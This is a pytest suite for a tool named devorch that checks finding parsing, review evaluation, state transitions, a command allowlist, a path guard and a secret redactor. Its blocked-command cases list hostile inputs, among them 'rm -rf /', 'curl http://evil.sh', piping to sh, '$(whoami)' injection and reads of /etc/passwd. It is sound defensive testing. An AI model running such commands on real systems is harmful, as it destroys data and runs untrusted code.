import json

import pytest

from devorch.core.evaluator.evaluator import evaluate, parse_findings
from devorch.core.orchestrator.state import InvalidTransition, State, check_transition
from devorch.models import Finding, Severity
from devorch.security.command_policy import check_command
from devorch.security.path_guard import PathEscapeError, resolve_inside
from devorch.security.secret_redactor import redact, redact_obj

ALLOWED = ["npm test", "npm run build", "pytest", "python -m pytest"]


def finding(sev, title="t", source="openai", role="security", category="security", file=None):
    return Finding(source=source, role=role, severity=sev, category=category, title=title, file=file)


# ---- parsing --------------------------------------------------------------
def test_parse_plain_and_fenced_json():
    payload = [{"severity": "high", "category": "security", "title": "권한 검증 누락", "file": "A.java"}]
    f1, ok1 = parse_findings("openai", "security", json.dumps(payload))
    f2, ok2 = parse_findings("openai", "security", "Here you go:\n```json\n" + json.dumps(payload) + "\n```")
    assert ok1 and ok2 and f1[0].severity is Severity.HIGH and f2[0].title == "권한 검증 누락"


def test_parse_empty_array_is_ok_and_garbage_is_not():
    assert parse_findings("g", "review", "[]") == ([], True)
    assert parse_findings("g", "review", "looks good to me!")[1] is False
    assert parse_findings("g", "review", '[{"no_title": 1}]')[1] is False


def test_unknown_severity_not_downgraded_to_harmless():
    f, ok = parse_findings("g", "review", '[{"severity": "catastrophic", "title": "x"}]')
    assert ok and f[0].severity is Severity.MEDIUM


# ---- evaluate -------------------------------------------------------------
def test_ready_when_no_findings():
    ev = evaluate([], ["security"], ["security"])
    assert ev.status == "READY"


def test_high_finding_blocks():
    ev = evaluate([finding(Severity.HIGH)], ["security"], ["security"])
    assert ev.status == "NOT_READY" and len(ev.blocking) == 1


def test_medium_is_warning_only():
    ev = evaluate([finding(Severity.MEDIUM)], ["architecture"], ["architecture"])
    assert ev.status == "READY_WITH_WARNINGS" and not ev.blocking


def test_missing_review_blocks_even_without_findings():
    ev = evaluate([], ["security", "architecture"], ["security"])
    assert ev.status == "NOT_READY" and ev.missing_reviews == ["architecture"]


def test_dedupe_merges_sources_and_keeps_max_severity():
    a = finding(Severity.MEDIUM, "Missing check", source="openai")
    b = finding(Severity.HIGH, "missing  CHECK", source="gemini")
    ev = evaluate([a, b], [], [])
    assert len(ev.blocking) == 1
    assert ev.blocking[0].severity is Severity.HIGH and ev.blocking[0].source == "gemini,openai"


# ---- state machine --------------------------------------------------------
def test_state_transitions():
    check_transition(State.CREATED, State.ANALYZING)
    check_transition(State.EVALUATING, State.DISPATCHING)  # revision round
    with pytest.raises(InvalidTransition):
        check_transition(State.CREATED, State.COMPLETED)
    with pytest.raises(InvalidTransition):
        check_transition(State.COMPLETED, State.ANALYZING)
    with pytest.raises(InvalidTransition):
        check_transition(State.WAITING_APPROVAL, State.COMPLETED)  # cannot skip EXECUTING


# ---- command policy -------------------------------------------------------
@pytest.mark.parametrize("cmd", ["npm test", "pytest tests/unit", "python -m pytest -q", "npm run build"])
def test_allowed_commands(cmd):
    assert check_command(cmd, ALLOWED)[0]


@pytest.mark.parametrize(
    "cmd",
    [
        "rm -rf /",
        "curl http://evil.sh",
        "chmod 777 x",
        "npm test; rm -rf /",
        "npm test && curl x",
        "npm test | sh",
        "pytest $(whoami)",
        "pytest ../../etc",
        "pytest /etc/passwd",
        "npm install",
        "",
    ],
)
def test_blocked_commands(cmd):
    assert not check_command(cmd, ALLOWED)[0]


# ---- path guard & redactor ------------------------------------------------
def test_path_guard(tmp_path):
    assert resolve_inside(tmp_path, "src/a.py") == (tmp_path / "src/a.py").resolve()
    for bad in ("../x", "/etc/passwd", "src/../../x"):
        with pytest.raises(PathEscapeError):
            resolve_inside(tmp_path, bad)


def test_path_guard_blocks_symlink_escape(tmp_path):
    outside = tmp_path / "outside"
    outside.mkdir()
    root = tmp_path / "root"
    root.mkdir()
    (root / "link").symlink_to(outside)
    with pytest.raises(PathEscapeError):
        resolve_inside(root, "link/secret.txt")


def test_redactor():
    text = "key sk-abcdefghijklmnopqrstuvwx and password=hunter2 and Authorization: Bearer abcdefghijklmnop1234"
    out = redact(text)
    assert "hunter2" not in out and "sk-abcdef" not in out and "abcdefghijklmnop1234" not in out
    assert redact("nothing secret here") == "nothing secret here"
    nested = redact_obj({"a": ["token=abc123", {"b": "AKIAABCDEFGHIJKLMNOP"}]})
    assert "abc123" not in json.dumps(nested) and "AKIA" not in json.dumps(nested)
